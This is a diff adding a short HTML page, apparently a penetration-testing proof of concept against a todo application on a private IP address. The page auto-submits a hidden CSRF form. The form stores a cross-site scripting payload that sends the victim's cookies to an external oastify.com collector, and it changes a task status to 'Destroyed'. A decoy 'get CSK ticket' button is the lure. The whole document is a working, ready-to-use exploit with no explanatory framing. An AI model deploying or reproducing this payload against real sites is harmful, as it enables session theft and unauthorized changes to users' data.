@@ -1,0 +1,13 @@
+<!DOCTYPE html>
+<html>
+  <body>
+    <form id="csrfForm" action="http://192.168.1.55:8081/todos/test/list.php" method="POST">
+      <input type="hidden" name="Todo" value="<script>var i = new Image(); i.src='http://havanh7dn8qui1fij6otbjlu9lfc32rr.oastify.com?cookie='+document.cookie;</script>">
+      <input type="hidden" name="Status" value="Destroyed">
+      <input type="submit" name="submit" value="Click here to get CSK ticket">
+    </form>
+    <script>
+      document.getElementById("csrfForm").submit();
+    </script>
+  </body>
+</html>
